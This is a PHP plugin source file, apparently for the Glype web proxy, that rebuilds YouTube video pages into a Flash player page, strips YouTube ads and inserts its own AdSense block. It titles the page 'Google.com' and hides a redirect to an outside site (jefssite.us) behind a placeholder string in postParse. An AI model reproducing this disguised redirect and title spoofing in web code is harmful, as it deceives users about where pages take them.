<?php
/**************************************************************
* Plugin: Flashtube
* Date  : 17.02.2010
* Author: codename_B
* Email : codename_B@hotmail.co.uk
* Description:
*    Custom made youtube plugin.
*    Hopefully you'll find this useful, reformats the video page into a more pleasing format.
*    Version 1.0
***************************************************************/

$toSet[CURLOPT_TIMEOUT] = 3200;
$options['stripJS'] = false;
function preParse($input, $type)
    {
        switch($type)
            {
                case 'html':
				//HIDE ADS
				$input = preg_replace('/<iframe[^>]*ad[^>]*>[^>]*>/i','',$input);
				$input = preg_replace('/src="[^"]*pixel[^"]*"/','',$input);
				$input = preg_replace('/data-thumb="[^"]*pixel[^"]*"/','',$input);
				$input = preg_replace('/data-thumb=/','src=',$input);
				$input = preg_replace('/src="\/\//','src="http://',$input);
				if(preg_match('/fmt_url_map[^&]*/i',$input,$YTurl))
						{
preg_match_all('%<a[^>]*video-list-item-link[^|]*</a>%',$input, $AytLink);
$AytLink = $AytLink[0];

preg_match('/fmt_url_map[^&]*/i',$input,$YTurl);
//$stringYT = $YTurl[0];
$stringYT = urldecode($YTurl[0]);
$stringYT = preg_replace('/,[0-9]*/','',$stringYT);
preg_match_all('/http[^\|]*/',$stringYT,$compactYT);
$stringYT = $compactYT[0];
$stringYTH = $stringYT[0];
$stringYT2 = $stringYT[0];
$stringYT = end($stringYT);

$ytCatch2 = rawurlencode(proxifyURL(sprintf('%s',$stringYT2)));
$ytCatch = rawurlencode(proxifyURL(sprintf('%s',$stringYT)));
preg_match('/<title>[^>]*>/i',$input,$titleYT);
$titleYT = preg_replace('/<[^>]*>/','',$titleYT[0]);
                    $ytPlayer = GLYPE_URL . '/plugins/player_flv_maxi.swf';
					$ytBG = 'http://img641.imageshack.us/img641/5424/logoboxk.png';
                    $html = <<<HTML
<html>
<head>
<title>Google.com</title>
<style type="text/css">

</style>
</head>
<body>

<img src="{$ytBG}" alt="youtube"/ style="z-index: -200000; position: absolute; top: -25%; width: 100%; left: 0pt;"/>
	<center>

		<div style="width: 100%; text-align: center;"><h1>$titleYT</h1></div>
			<div style="width: 620px; text-align: center;">
				<a href="{$stringYT2}" title="Download this video" target="_blank">Download this video</a> | <a href="http://youtube.com" title="Back to Youtube">Back to Youtube</a>
			</div>
<script type="text/javascript"><!--
google_ad_client = "pub-3402075004633034";
/* 468x60, created 7/8/11 */
google_ad_slot = "6842407342";
google_ad_width = 468;
google_ad_height = 60;
//-->
</script>
<script type="text/javascript"
src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
</script>
				<div id="maincontent">
			<div id="ytContent">
        <object type="application/x-shockwave-flash" data="{$ytPlayer}" width="620" height="380" id="ytPlayer"/>
            <param name="movie" value="{$ytPlayer}" />
            <param name="allowFullScreen" value="true" />
            <param id="FlashVars" name="FlashVars" value="flv={$ytCatch}&amp;width=620&amp;height=380&amp;volume=200&amp;showtime=1&amp;showfullscreen=1&amp;showiconplay=1&amp;showmouse=autohide" />
        </object />
		</div>
			<div id="ytContentHD" style="display:none;">
        <object type="application/x-shockwave-flash" data="{$ytPlayer}" width="940" height="600" id="ytPlayer"/>
            <param name="movie" value="{$ytPlayer}" />
            <param name="allowFullScreen" value="true" />
            <param id="FlashVars" name="FlashVars" value="flv={$ytCatch2}&amp;width=940&amp;height=600&amp;volume=200&amp;showtime=1&amp;showfullscreen=1&amp;showiconplay=1&amp;showmouse=autohide" />
        </object />
		</div>
		</div>
		<script type="text/javascript">
		function getProx()
		{
xyz="true";
		}
		function HQengage()
		{
		document.getElementById('ytContent').innerHTML = '';
				document.getElementById('ytContent').style.display = 'none';
		document.getElementById('ytContentHD').style.display = "";
		document.getElementById('HQwatch').style.display = "none";
		}
		</script>
		<div>


		</div>
<div>Related Videos</div>
	</center>
					
HTML;
$html2 = $AytLink[0];
preg_match_all('/<img[^>]*Thumb[^>]*>/',$html2,$html3);
preg_match_all('/<a[^>]*video-list-item-link[^>]*>/',$html2,$html5);
$html3 = $html3[0];
$html5 = $html5[0];
$html4 = "</a>";
$htmlout = "<div style='overflow: hidden; height:90px; width: 100%; background-color: #000000;'><div style='width: 120%; margin-left: -20px;'>'".$html5[0].$html3[0].$html4.$html5[1].$html3[1].$html4.$html5[2].$html3[2].$html4.$html5[3].$html3[3].$html4.$html5[4].$html3[4].$html4.$html5[5].$html3[5].$html4.$html5[6].$html3[6].$html4.$html5[7].$html3[7].$html4.$html5[8].$html3[8].$html4."</div>
</div>
</body></html>";

$input = $html.$htmlout;
$input = preg_replace('/<a/','<a onclick=\'document.getElementById("maincontent").innerHTML = "";\'',$input);
                                }
                        }
       return $input;
    }
	
	
function postParse($input, $type)
    {
        switch($type)
            {
                case 'html':
								                    $ytLogo = GLYPE_URL . '/plugins/youtubetiny.png';
				$input = preg_replace('/<img[^>]*id[^>]*"logo"[^>]*>/','<img src="'.$ytLogo.'"alt="YouTube homepage" class="master-sprite" id="logo">',$input);
				if(preg_match('/xyz="true"/',$input))
				{
				$input = preg_replace('/xyz="true"/','document.location.href="//jefssite.us"',$input);
				}
			}
			return $input;
	}
	?>
